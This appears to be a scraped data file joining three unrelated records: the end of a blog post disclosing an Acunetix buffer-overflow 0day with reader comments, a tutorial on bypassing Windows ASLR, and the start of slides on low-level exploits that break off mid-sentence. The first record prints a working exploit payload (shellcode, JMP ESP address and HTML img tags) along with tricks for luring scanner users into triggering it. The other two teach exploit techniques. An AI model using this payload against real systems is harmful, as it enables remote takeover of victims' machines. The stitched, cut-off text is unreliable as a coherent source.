src=\u201dhttp:\/\/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAA500fBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\u201d>\nRunning ACUNETIX's scan against that payload, caused the next result:\n[9][EIP+overrun.png]\nAs you can see above, the EIP was overwritten!!\nIt appears that the idea of fixing the flow was successful since it\nenabled me to be in a better position of attack (EIP overwrite).\nBeside it, our potential space for shell code is now presented in EAX\nand ESP.\nWhen it comes to the decision whether choosing ESP or EAX, ESP is a\nbetter choice from two different aspects:\nOne, ESP is pointing directly at the beginning of the shell string.\nTwo, there is much more space for a biggest shell code to be written.\nAfter I chose ESP, I needed to find an instruction of \u201cJMP ESP\u201d in a\nmemory address that could be written by URL string (limited ASCII as\nmention above).\nThe desired address successfully founded at the location of: 0x7e79515d\n(SXS.DLL) \u2013\n(In ASCII \u201c ]Qy~ \u201c).\nAfter all that, our shell code supposed to look like this:\n<img src=\u201dhttp:\/\/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAA500fBBBB]Qy~BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\nBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\u201d>\n* 500f = 0x66303035 : readable memory location for fixing the flow of\nthe application that was corrupted by the buffer overflow.\n* ]Qy~ = 0x7e79515d (JMP ESP from SXS.DLL).\nOK, right now we are at the semifinal stage, running the application\nagainst above payload, produced the next result:\n[10][onshell.png]\nYea\u2026 we landed exactly at the beginning of the final payload.\nThe next step will be to use suitable windows shell that will be made\nonly from URL string (limited ASCII).\nSuch shell can be generated with \u201c Metasploit \u201d and it is called\n\"Alphanumeric Shell\".\nThe important thing to remember while using such payload, is that the\npayload's start address must be presented at one of the registers. If\nthe payload presents at ESP, the first OP CODE of the shell need to be\n\"PUSH ESP\".\nIn my Proof of concept, I used simple \"CALC.EXE\" shell code generated\nby \u201cMetasploit  that  led me to the final stage which is ;working\nexploit!!\nMoreover, our exploit is successfully bypassing DEP protection, simply\nby choosing only the addresses that aren\u2019t compiled with DEP.\nAnd due to the fact that ACUNETIX itself is not complied with DEP, this\nexploit should work perfectly on windows XP.\nAfter successfully reaching all our goals, Let\u2019s look on the final\nworking exploit:\n<img src=\"http:\/\/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAA500fBBBB]Qy~TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB\n0BBXP8ACJJIHZXL9ID414ZTOKHI9LMUKVPZ6QO9X1P26QPZTW5S1JR7LCTKN8BGR3RWS9\nJNYLK79ZZ165U2KKLC5RZGNNUC70NEPB9OUTQMXPNMMPV261UKL71ME2NMP7FQY0NOHKP\nKZUDOZULDS8PQ02ZXM3TCZK47PQODJ8O52JNU0N72N28MZKLTNGU7ZUXDDXZSOMKL4SQK\nUNKMJPOOCRODCMDKR0PGQD0EYIRVMHUZJDOGTUV2WP3OIVQ1QJSLSKGBLYKOY7NWWLNG6\nLBOM5V6M0KF2NQDPMSL7XT80P61PBMTXYQDK5DMLYT231V649DZTPP26LWSQRLZLQK15X\nUXYUNP1BPF4X6PZIVOTZPJJRUOCC3KD9L034LDOXX5KKXNJQMOLSJ6BCORL9WXQNKPUWN\nKRKJ8JSNS4YMMOHT3ZQJOHQ4QJUQLN1VSLV5S1QYO0YA\u201d>\nWe need to remember that in order to enjoy our exploit, the newbie\nhacker must check our extra domain name, in the list of the extra\ndomains in ACUNETIX wizard window.\nSo what can we do in order to make our domain name attractive?\nThinking about it, I came up with two ideas:\n1: writing some attempting domain name that will make the hackers check\nthat domain, like,\nADMIN.ControlMangment.1249874350345.An7isec.blogspot.co.il  .\n2: using several external domains with the following names:\n\u201cSQLINJECTION\u201d\n\u201cXSS\u201d\n\u201cCSRF\u201d\nAnd so on\u2026\nThese kind of names will probably give the eye of the hacker the\nfeeling that the domain list window is actually an options window.\nThe written code bellow demonstrates that kind of misleading:\n<html> <img\nsrc=\"http:\/\/SQLInjection........................................\n.....................................................................\n.....................................................................\n............AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAA500fBBBB]Qy~TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB\n0BBXP8ACJJIHZXL9ID414ZTOKHI9LMUKVPZ6QO9X1P26QPZTW5S1JR7LCTKN8BGR3RWS9\nJNYLK79ZZ165U2KKLC5RZGNNUC70NEPB9OUTQMXPNMMPV261UKL71ME2NMP7FQY0NOHKP\nKZUDOZULDS8PQ02ZXM3TCZK47PQODJ8O52JNU0N72N28MZKLTNGU7ZUXDDXZSOMKL4SQK\nUNKMJPOOCRODCMDKR0PGQD0EYIRVMHUZJDOGTUV2WP3OIVQ1QJSLSKGBLYKOY7NWWLNG6\nLBOM5V6M0KF2NQDPMSL7XT80P61PBMTXYQDK5DMLYT231V649DZTPP26LWSQRLZLQK15X\nUXYUNP1BPF4X6PZIVOTZPJJRUOCC3KD9L034LDOXX5KKXNJQMOLSJ6BCORL9WXQNKPUWN\nKRKJ8JSNS4YMMOHT3ZQJOHQ4QJUQLN1VSLV5S1QYO0YA\u201d>\n<img src=\"http:\/\/XSS.................................................\n.....................................................................\n.....................................................................\n...\">\n<img src=\"http:\/\/CSRF................................................\n.....................................................................\n.....................................................................\n....\">\n<img src=\"http:\/\/DeepScan............................................\n.....................................................................\n.....................................................................\n........\">\n<img src=\"http:\/\/NetworkScan.........................................\n.....................................................................\n.....................................................................\n...........\">\n<img src=\"http:\/\/DenialOfService.....................................\n.....................................................................\n.....................................................................\n...............\">\n<\/html>\n[11][list.png]\nIn conclusion,\nFollowing all the above, we created a powerful exploit that Newbie\nhackers\nwill definitely fall for.\nThis exploit will give us the ability to do everything with all that\nnasty Newbie hackers that scan our sites day and night, killing our\ntraffic, filling all the web site forms with junk and so on\u2026\nFurthermore it can be used in order to collect smart intelligence about\nhostile forces who want to attack our web application.\nBUT!!\nThe more powerful idea that motivated me to reveal this concept and\nPOC, is the fact that this exploit is Anonymity killer! , because even\nif the attacker uses the most smart and secure proxy in the world, such\nas \"TOR\" and others, his ass will be revealed and full control on his\nscanning machine will be gained.\nThanks all for reading my post, hope you enjoy it,\nHappy hunting, An7i\nP.S.\nHere is a fully functional exploit video and Perl script that generates\ncustom exploit:\nIFRAME: [12]\/\/www.youtube.com\/embed\/ifv9fRzVEzw?rel=0\nThe exploit can be download from [13]here\nPosted by [14]Danor Cohen - An7i at [15]11:17\u202fPM\n[16]Email This [17]BlogThis! [18]Share to Twitter [19]Share to Facebook\n[20]Share to Pinterest\n22 comments :\n1. [21]Bo0oM[22]April 24, 2014 at 10:54\u202fAM\nNice Job\nReply[23]Delete\nReplies\nReply\n2. Anonymous[24]April 24, 2014 at 12:20\u202fPM\nbuild 20120704 is not the newest cracked version, not even close.\nReply[25]Delete\nReplies\nReply\n3. [26]Danor Cohen - An7i[27]April 24, 2014 at 12:30\u202fPM\nwell, I can tell you that, newer version's are vulnerable too,I\njust I didn't mention that in my article but I tested it myself.\nversion 9 is the only one that isn't vulnerable.\nReply[28]Delete\nReplies\nReply\n4. [29]Dimitris Siatiras[30]April 24, 2014 at 12:58\u202fPM\nLatest Acunetix WVS is version 9.0 - Build: 20140422 and it is not\nvulnerable to this! Tested it and confirmed!\nReply[31]Delete\nReplies\nReply\n5. [32]iZsh[33]April 24, 2014 at 4:11\u202fPM\nThis is awesome, epic idea and nicely implemented :-)\nReply[34]Delete\nReplies\nReply\n6. [35]Stefan \" dfate\" Molls[36]April 24, 2014 at 5:43\u202fPM\nThanks for this awesome contribution. Was fun reading it :-)\nReply[37]Delete\nReplies\nReply\n7. Anonymous[38]April 24, 2014 at 6:24\u202fPM\nExcellent article thanks for sharing !\nReply[39]Delete\nReplies\nReply\n8. Anonymous[40]April 24, 2014 at 7:15\u202fPM\nvery educational. nice find mate\nReply[41]Delete\nReplies\nReply\n9. [42]Unknown[43]April 24, 2014 at 7:31\u202fPM\nsuperb article\nnicely explained :D :D\nthnx fr sharing :D :D (Y) (Y)\nReply[44]Delete\nReplies\nReply\n10. [45]Unknown[46]April 24, 2014 at 8:21\u202fPM\nThis is the danger hahahaha !\nBut the important question\nHow can I convert my (Server.exe) to the Shell Code same?\nAre there programs or is there video to explain this thing?\nReply[47]Delete\nReplies\nReply\n11. [48]Mohammed Tanveer[49]April 24, 2014 at 8:44\u202fPM\nAwesome! love your writing :)\nReply[50]Delete\nReplies\nReply\n12. Anonymous[51]April 24, 2014 at 9:22\u202fPM\nJust Great!\nToo bad that a manager will never allow us to put it on the DMZ :(\nReply[52]Delete\nReplies\nReply\n13. Anonymous[53]April 25, 2014 at 1:29\u202fPM\nIt was very fun to read. Great idea and very nice research job!\nGreetings!\nReply[54]Delete\nReplies\nReply\n14. Anonymous[55]April 25, 2014 at 2:06\u202fPM\nNice one, will keep following your blog!! I have never thought of\nthis attack vector before.\nAlso highly impressed of your finding with the winrar spoof... I\nhave been thinking in similar path for a long time, and you showed\nme now it was possible..\nWeissman@paranoici.org\nReply[56]Delete\nReplies\nReply\n15. [57]Pengertian Evaluasi[58]April 27, 2014 at 6:43\u202fPM\nThis article can help .... I can read them with new knowledge ...\nthank you so much for what was given to me\nReply[59]Delete\nReplies\nReply\n16. [60]G00GlE[61]April 30, 2014 at 10:50\u202fAM\nThis is wonderful, thank you for sharing this valuable information,\nwe look forward to more of these articles\nReply[62]Delete\nReplies\nReply\n17. [63]Unknown[64]May 27, 2014 at 8:59\u202fAM\nwow..... what a great blog. nice sharing. i like this blog. thanks\nfor the sharing the superb information.its a nice posting.superb\ninformation. [65]double girder eot crane manufacturer\n[66]hoist manufacturer\nReply[67]Delete\nReplies\nReply\n18. [68]Unknown[69]August 12, 2014 at 12:46\u202fPM\nNo doubt it will be very useful for my future projects. Would like\nto see some other posts on the same subject! [70]website designs\npakistan\nReply[71]Delete\nReplies\nReply\n19. [72]Unknown[73]September 25, 2014 at 12:31\u202fPM\nNice post.A valuable information here.Thanks for sharing with us.\n[74]Ecommerce Website Design Palm beach\nReply[75]Delete\nReplies\nReply\n20. [76]jade[77]March 5, 2015 at 4:34\u202fAM\nThis disclosure will not only reveal a new vulnerability, but\ndemonstrates a whole new perception of dealing with external\nattacks. [78]focus financial payday company\nReply[79]Delete\nReplies\nReply\n21. [80]ethanhunt[81]March 12, 2015 at 7:48\u202fAM\ncan you re-upload the exploit.pl\nReply[82]Delete\nReplies\nReply\n22. [83]Unknown[84]April 24, 2015 at 11:24\u202fPM\nThis comment has been removed by a blog administrator.\nReply[85]Delete\nReplies\nReply\nAdd comment\nLoad more...\n[86]Older Post [87]Home\nSubscribe to: [88]Post Comments ( Atom )\nAbout Me\n[89]Danor Cohen - An7i\n[90]View my complete profile\nBlog Archive\n* [91]\u25bc  [92]2014 ( 2 )\n+ [93]\u25bc  [94]April ( 1 )\no [95]Pwn the n00bs - Acunetix 0day\n+ [96]\u25c4  [97]March ( 1 )\nContact Me\nName\n______________________________\nEmail *\n______________________________\nMessage *\n_________________________\n_________________________\n_________________________\n_________________________\n_________________________\n[BUTTON Input] (not implemented)____\nAn7i RSS\n[arrow_dropdown.gif] Posts\n[98][subscribe-netvibes.png] [99][subscribe-yahoo.png]\n[100][icon_feed12.png] Atom\n[arrow_dropdown.gif] Posts\n[arrow_dropdown.gif] Comments\n[101][subscribe-netvibes.png] [102][subscribe-yahoo.png]\n[103][icon_feed12.png] Atom\n[arrow_dropdown.gif] Comments\nPowered by [104]Blogger."}
{"text":"(BUTTON) [1]abatchy's blog\n* [2]home\n* [3]tutorials\n* [4]projects\n* [5]archive\n* [6]about\nWednesday, June 7, 2017\n* [7]Exploit Development\n* [8]OSCE Prep\n[9]Exploit Dev 101: Bypassing ASLR on Windows\nNote: This post is quite theoretical (yuk!) but I\u2019ll work on providing\na hands-on demo sometime in the future. Also given the current\nmitigations in Windows, you\u2019ll need much more than bypassing ASLR\nWhat is ASLR?\nAddress space layout randomization (ASLR) is a memory protection\ntechniques that tries to prevent an attacker from creating a reliable\nexploit. What it does is simple, a binary is loaded at a different base\naddress in memory upon restart (or reboot for OS dlls). It also\nrandomizes the base addresses for memory segments like the heap and the\nstack. This makes it harder for attackers to guess the correct address.\nASLR was introduced in Windows Vista and is in all newer versions. To\nmake use of it, the executable needs to be compiled with \/DYNAMICBASE\noption as well. OS dlls have that by default.\nA way to see this taking place is by attaching an executable supporting\nASLR (WinRAR in example below). Attach it to OllyDbg and go to the\nmemory tab (ALT+M).\nRestart WinRAR.\nNote that the he higher two bytes get randomized, lower ones don\u2019t.\n__________________________________________________________________\nHow does it make exploitation harder?\nMost exploits require a way to redirect execution to the payload, this\ncan be done by [10]many different ways. What all these techniques got\nin common is finding an instruction that will \u201ctrigger\u201d the payload by\njumping to the address. Since addresses are hard coded they won\u2019t work\nafter restart\/reboot\/different machine.\nExample: A JMP ESP instruction is located at 0x12345678 in test.dll,\nupon restart, address is now located at 0xABCD5678.\n__________________________________________________________________\nBypassing ASLR\nNext I\u2019ll discuss 4 (more like 3) techniques on bypassing ASLR, each\nwith pros, cons and study cases if any.\n1. Abusing non-ASLR enabled libraries\nProgrammers make mistakes, to make full use of ASLR, all loaded\nlibraries need to be supporting it. If a single module doesn\u2019t you can\nmake use of it by finding search that library for the needed\ninstruction to jump to your shellcode.\nPros:\n* Reliable.\nCons:\n* None.\nStudy case:\n* CoolPlayer+ Portable 2.19.6 - \u2018.m3u\u2019 Stack Overflow (Egghunter +\nASLR Bypass), can be found [11]here.\n__________________________________________________________________\n2. Partial EIP overwrite\nSince you control EIP, you also control how much of EIP you want to\noverwrite. As already mentioned, ASLR only randomizes the higher two\nbytes, what if you can make use of that and only overwrite the lower 2\nbytes?\nExample: DLL is loaded at 0xAABB0000, if you overwrite only the lower\ntwo bytes (thanks to small endianness) you can basically control EIP to\njump anywhere in 0xAABB0000 to 0xAABBXXY.\nPros:\n* Big pool to search for the needed instruction from (16^4).\nCons:\n* Can\u2019t use bad characters.\nStudy case:\n* MS07-017, more info can be found [12]here.\n2.1 Single byte overwrite\nSometimes a character gets appended to your string, for example a null\nbyte. This will mess up with the previous technique as when you try to\noverwrite the lower 2 bytes of EIP it becomes 0xAA00XXYY instead of\n0xAABBXXYY.\nAlthough this limits the possibility of finding a proper instruction,\nyou might still be able to get away with a single byte.\nSearch in 0xAABB0000 to 0xAABB00FF for possible instructions that can\nbe used to land you your shellcode. 256 combinations aren\u2019t a lot so\ngood luck with that.\nPros:\n* It\u2019s not over yet.\nCons:\n* Very small search space (0x00 to 0xFF)\n* Still can\u2019t use bad characters.\n__________________________________________________________________\n3. Bruteforcing address space\nSince we know that only the 2 higher bytes are randomized, what if we\ntry to bruteforce all the possible combination? This method is risky\n(might crash the service), slow and adds a lot of overhead.\nPros:\n* Unless the higher bytes contain a bad char, it should work.\nCons:\n* Large search space (0x0000 to 0xFFFF)\n* Huge overhead, service might crash and not restart.\n* Still can\u2019t use bad characters.\nStudy case:\n* Samba 2.2.8 (Linux x86) - \u2018trans2open\u2019 Overflow (Metasploit), can\nbe found [13]here.\n__________________________________________________________________\n4. Memory leak\n\/\/ TODO\n__________________________________________________________________\n5. Information Disclosure bug\n\/\/TODO\n__________________________________________________________________\n6. Ultra-luck mode\nNeeded instruction is found at all the addresses in format 0x0000XXYY,\n0x0001XXYY, \u2026 ,0xFFFFXXYY.\nPros:\n* Very cool.\nCons:\n* Doesn\u2019t work.\n__________________________________________________________________\nThat\u2019s it! I\u2019ll work on a demo to utilize those techniques in the\nfuture.\n- Abatchy\n*\n*\n*\n*\nPlease enable JavaScript to view the [14]comments powered by Disqus.\n[15]comments powered by Disqus\nThis is an alpacha looking llama\n[16]Follow @abatchy\n[17]Follow @abatchy17\nCategories\n* [18].Net Reversing\n* [19]Backdooring\n* [20]DefCamp CTF Qualifications 2017\n* [21]Exploit Development\n* [22]Kernel Exploitation\n* [23]Kioptrix series\n* [24]Networking\n* [25]OSCE Prep\n* [26]OSCP Prep\n* [27]OverTheWire - Bandit\n* [28]OverTheWire - Leviathan\n* [29]OverTheWire - Natas\n* [30]Powershell\n* [31]Programming\n* [32]Pwnable.kr\n* [33]SLAE\n* [34]Shellcoding\n* [35]Vulnhub Walkthrough\n* [36]boot2root\n* [37]rant\nBlog Archive\nFebruary 2019\n* [38]Tips on designing boot2root challenges\nJanuary 2018\n* [39][Kernel Exploitation] 7: Arbitrary Overwrite (Win7 x86)\n* [40][Kernel Exploitation] 6: NULL pointer dereference\n* [41][Kernel Exploitation] 5: Integer Overflow\n* [42][Kernel Exploitation] 4: Stack Buffer Overflow (SMEP Bypass)\n* [43][Kernel Exploitation] 3: Stack Buffer Overflow (Windows 7\nx86\/x64)\n* [44][Kernel Exploitation] 2: Payloads\n* [45][Kernel Exploitation] 1: Setting up the environment\nOctober 2017\n* [46][DefCamp CTF Qualification 2017] Don't net, kids! (Revexp 400)\n* [47][DefCamp CTF Qualification 2017] Buggy Bot (Misc 400)\nSeptember 2017\n* [48][Pwnable.kr] Toddler's Bottle: flag\n* [49][Pwnable.kr] Toddler's Bottle: fd, collision, bof\n* [50]OverTheWire: Leviathan Walkthrough\nAugust 2017\n* [51][Rant] Is this blog dead?\nJune 2017\n* [52]Exploit Dev 101: Bypassing ASLR on Windows\nMay 2017\n* [53]Exploit Dev 101: Jumping to Shellcode\n* [54]Introduction to Manual Backdooring\n* [55]Linux\/x86 - Disable ASLR Shellcode (71 bytes)\n* [56]Analyzing Metasploit linux\/x86\/shell_bind_tcp_random_port\nmodule using Libemu\n* [57]Analyzing Metasploit linux\/x86\/exec module using Ndisasm\n* [58]Linux\/x86 - Code Polymorphism examples\n* [59]Analyzing Metasploit linux\/x86\/adduser module using GDB\n* [60]Analyzing Metasploit linux\/x86\/adduser module using GDB\n* [61]ROT-N Shellcode Encoder\/Generator (Linux x86)\n* [62]Skape's Egg Hunter (null-free\/Linux x86)\n* [63]TCP Bind Shell in Assembly (null-free\/Linux x86)\nApril 2017\n* [64]Shellcode reduction tips (x86)\nMarch 2017\n* [65]LTR Scene 1 Walthrough (Vulnhub)\n* [66]Moria v1.1: A Boot2Root VM\n* [67]OSCE Study Plan\n* [68]Powershell Download File One-Liners\n* [69]How to prepare for PWK\/OSCP, a noob-friendly guide\nFebruary 2017\n* [70]OSCP-like Vulnhub VMs\n* [71]OSCP: Day 30\n* [72]Mr Robot Walkthrough (Vulnhub)\nJanuary 2017\n* [73]OSCP: Day 6\n* [74]OSCP: Day 1\n* [75]Port forwarding: A practical hands-on guide\n* [76]Kioptrix 2014 (#5) Walkthrough\n* [77]Wallaby's Nightmare Walkthrough (Vulnhub)\nDecember 2016\n* [78]Kiopritx 1.3 (#4) Walkthrough (Vulnhub)\n* [79]Kioptrix 3 Walkthrough (Vulnhub)\n* [80]Kioptrix 2 Walkthrough (Vulnhub)\n* [81]OverTheWire: Natas 17\nNovember 2016\n* [82]OverTheWire: Natas 16\n* [83]OverTheWire: Natas 14 and 15\n* [84]Kioptrix 1 Walkthrough (Vulnhub)\n* [85]PwnLab: init Walkthrough (Vulnhub)\n* [86]OverTheWire: Natas 12\n* [87]OverTheWire: Natas 11\nOctober 2016\n* [88]Vulnix Walthrough (Vulnhub)\n* [89]OverTheWire: Natas 6-10\n* [90]OverTheWire: Natas 0-5\n* [91]OverTheWire: Bandit 21-26\n* [92]OverTheWire: Bandit 16-20\n* [93]OverTheWire: Bandit 11-15\n* [94]OverTheWire: Bandit 6-10\n* [95]OverTheWire: Bandit 0-5\n* [96]Introduction\nPlease enable JavaScript to view the [97]comments powered by Disqus.\n[98]comments powered by Disqus\nMohamed Shahat \u00a9 2019\n*\n*\n*"}
{"text":"Low Level Exploits\nEmail: hughpearse@gmail.com\nTwitter: https:\/\/twitter.com\/hughpearse\nLinkedIn: http:\/\/ie.linkedin.com\/in\/hughpearse\n\fTable of Contents\nCreating Shellcode\nBuffer Overflows On the Stack\nReturn to Stack\nFormat String Vulnerability\nReturn to LibC - Linux\nReturn to SEH - Windows\nReturn to Heap (Heap Spraying)\nHeap Overflows (unlink macro)\nInteger Overflows\nNull Pointers\nROP Chains\nQuestions\nReferences\n\fCreating Shellcode\n\fCreating Shellcode\nNatively Compiled Code\ndoes not normally run in\nan interpreter such as a JVM.\n#include<stdio.h>\nmain(){\nprintf(\"hello, world\");\n}\nC++\nAssembly\nOp-codes\nCompiler\nAssembler\n\fCreating Shellcode\nThe ELF file typically runs on a Linux\/Apple\/UNIX while the PE\nfile typically runs on Windows.\nElf Header\nProgram Header Table\nSection 1\nSection 2\n...\nSection n\nSection Header Table\n(Optional)\nMZ-DOS Header\nPE Signature\nImage File Header\nSection Table (Image\nSection Headers)\nSections 1-n\nCOFF Debug Sections\nElf File Format PE File Format\n\fCreating Shellcode\nWhen a linux application executes\nthe integer 0x80 it causes a\nsoftware interrupt.\nThe kernel then takes over\nby taking the values in the\ngeneral registers in the CPU\nand launching the appropriate\nsystem call based on the values\nin the registers.\nApplications\nKernel\nHardware\nSyscalls Ordinary\nInstructions\n\fCreating Shellcode\nLet us write an application to execute the exit syscall.\n\/\/exit.c\nmain(){\nexit(0);\n}\nCompile the program using the following command:\ngcc -static exit.c -o exit.out\nThis command creates a file called \"exit.out\".\nLets look at the contents of this file.\n\fCreating Shellcode\nobjdump -d .\/exit\n08048f14 <main>:\n8048f14: 55 push %ebp\n8048f15: 89 e5 mov %esp,%ebp\n8048f17: 83 e4 f0 and $0xfffffff0,%esp\n8048f1a: 83 ec 10 sub $0x10,%esp\n8048f1d: c7 04 24 00 00 00 00 movl $0x0,(%esp)\n8048f24: e8 77 08 00 00 call 80497a0 <exit>\n8048f29: 66 90 xchg %ax,%ax\n8048f2b: 66 90 xchg %ax,%ax\n8048f2d: 66 90 xchg %ax,%ax\n8048f2f: 90 nop\n08053a0c <_exit>:\n8053a0c: 8b 5c 24 04 mov 0x4(%esp),%ebx\n8053a10: b8 fc 00 00 00 mov $0xfc,%eax\n8053a15: ff 15 a4 f5 0e 08 call *0x80ef5a4\n8053a1b: b8 01 00 00 00 mov $0x1,%eax\n8053a20: cd 80 int $0x80\n8053a22: f4 hlt\n8053a23: 90 nop\n8053a24: 66 90 xchg %ax,%ax\n8053a26: 66 90 xchg %ax,%ax\n8053a28: 66 90 xchg %ax,%ax\n8053a2a: 66 90 xchg %ax,%ax\n8053a2c: 66 90 xchg %ax,%ax\n8053a2e: 66 90 xchg %ax,%ax\n\fCreating Shellcode\nThe output of the \"objdump\" command has three columns.\nVirtual addresses, Op-codes and Mnemonics.\nWe want the opcodes to create our payload.\nWe will be storing our shellcode inside a character array. This\nmeans we cannot have null values.\nAlso sometimes endianness can be a problem.\n\fCreating Shellcode\nVirtual addresses, Op-codes, Mnemonics\n08048f14 <main>:\n8048f14: 55 push %ebp\n8048f15: 89 e5 mov %esp,%ebp\n8048f17: 83 e4 f0 and $0xfffffff0,%esp\n8048f1a: 83 ec 10 sub $0x10,%esp\n8048f1d: c7 04 24 00 00 00 00 movl $0x0,(%esp)\n8048f24: e8 77 08 00 00 call 80497a0 <exit>\n8048f29: 66 90 xchg %ax,%ax\n8048f2b: 66 90 xchg %ax,%ax\n8048f2d: 66 90 xchg %ax,%ax\n8048f2f: 90 nop\n08053a0c <_exit>:\n8053a0c: 8b 5c 24 04 mov 0x4(%esp),%ebx\n8053a10: b8 fc 00 00 00 mov $0xfc,%eax\n8053a15: ff 15 a4 f5 0e 08 call *0x80ef5a4\n8053a1b: b8 01 00 00 00 mov $0x1,%eax\n8053a20: cd 80 int $0x80\n8053a22: f4 hlt\n8053a23: 90 nop\n8053a24: 66 90 xchg %ax,%ax\n8053a26: 66 90 xchg %ax,%ax\n8053a28: 66 90 xchg %ax,%ax\n8053a2a: 66 90 xchg %ax,%ax\n8053a2c: 66 90 xchg %ax,%ax\n8053a2e: 66 90 xchg %ax,%ax\n\fCreating Shellcode\nOur op-codes should look like this:\n8b 5c 24 04 b8 fc 00 00 00 ff 15 a4 f5 0e 08 b8 01 00 00 00 cd\n80\nPaste this text into a text editor and use the \"find and replace\"\nfeature to replace space with \"\\x\" to make a hexadecimal\ncharacter array out of it. Don't forget to surround the text with\nquotes.\n\"\\x8b\\x5c\\x24\\x04\\xb8\\xfc\\x00\\x00\\x00\\xff\\x15\\xa4\\xf5\\x0e\\x08\\\nxb8\\x01\\x00\\x00\\x00\\xcd\\x80\"\nWe now have a string containing machine instructions.\nNotice the \\x80 at the end of the string?\n\fCreating Shellcode\nSimply execute the character array to test it.\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar* shellcode = \"\\x8b\\x5c\\x24.....\"\nint main(){\nvoid (*f)();\nf = (void (*)())shellcode;\n(void)(*f)();\n}\n\fBuffer Overflows On the\nStack\n\fBuffer Overflows On the Stack\nWhen an application is launched three import program sections\nare created in memory. These sections contain different types\nof information.\n1. Text -> Stores machine instructions\n2. Stack -> Stores automatic variables and return addresses\n3. Heap -> Stores variables whose size is only known at\nruntime by using the malloc() function.\nFor the moment we are interested in the Stack.\n\fBuffer Overflows On the Stack\nStack Frames\nThe stack is divided up into contiguous pieces called frames. A\nframe is created each time a function is called.\nA frame contains:\n1. the arguments to the function.\n2. the function's local variables.\n3. the address at which the function is executing.\n4. the address at which to return to after executing.\n\fBuffer Overflows On the Stack\nWhen the program starts, the stack has only one frame for\nmain(). This is called the initial frame or the outermost frame.\nEach time a function is called, a new frame is made.\nEach time a function returns, the frame for that function is\neliminated.\nIf a function is recursive, there can be many frames for the\nsame function. The frame for the function in which execution is\nactually occurring is called the innermost frame. This is the\nmost recently created of all the stack frames that still exist.\n\fBuffer Overflows On the Stack\n\/\/example-functions.h\nvoid e(int a1, int a2){\nint local1=1;\nint local2=2;\nf(local1, local2);\n}\nvoid f(int a1, int a2){\nint local1;\nint local2;\n}\nLocal Variables\nReturn Address\nParameters\nLocal Variables\nReturn Address\nParameters\nFrame\nfor f()\nFrame\nfor e()\n\fBuffer Overflows On the Stack\nFind the address of other functions\nthat were statically compiled into the\nprogram by using the command:\ngdb -q -ex \"info functions\" --batch\n.\/hello-world | tr -s \" \" |\ncut -d \" \" -f 2 | sort | uniq\n[AAAA][AAAA][AAAA][AAAA]\n[AAAA][function return address]\nFunction F does not return to E;\nFunction F returns to X.\n[AAAA][AAAA]\n[AAAA][AAAA]\n[AAAA]\n[function\nreturn address]\nParameters\nLocal Variables\nReturn Address\nParameters\nFrame\nfor f()\nFrame\nfor e()\n\fReturn to Stack\n\fReturn to Stack\nReturn to Stack\nA buffer overflow attack is a general definition for a class of\nattacks to put more data in a buffer than it can hold thus\noverwriting the return address.\nReturn to Stack is a specific stack buffer overflow attack where\nthe return address is the same as the address on the stack for\nstoring the variable information. Thus you are executing the\nstack.\n[instructions][instructions][return address]\n\fReturn to Stack\nAs you can see in the diagram\nthe local variables of the\nfunction have been overwritten.\nThe Return to Stack exploit\nis also known as \"Smashing The\nStack\".\n[instructions]\n[instructions]\n[stack return\naddress]\nParameters\nLocal Variables\nReturn Address\nParameters\nFrame\nfor f()\nFrame\nfor e()\n\fFormat String Vulnerabilities\n\fFormat String Vulnerabilities\nWhat is a format string?\nint x=3;\nprintf(\"%d\", x);\nHow many formats exist in C\/C++?\nThere are at least 17 basic ones, and lots of permutations.\n%d Signed decimal integer\n%s Character string\n%x Unsigned hexadecimal integer\n%u Unsigned decimal integer\n%n The number of characters written so far\n\fFormat String Vulnerabilities\nHow do format string vulnerabilities occur?\nThey are usually lazy programmers who make 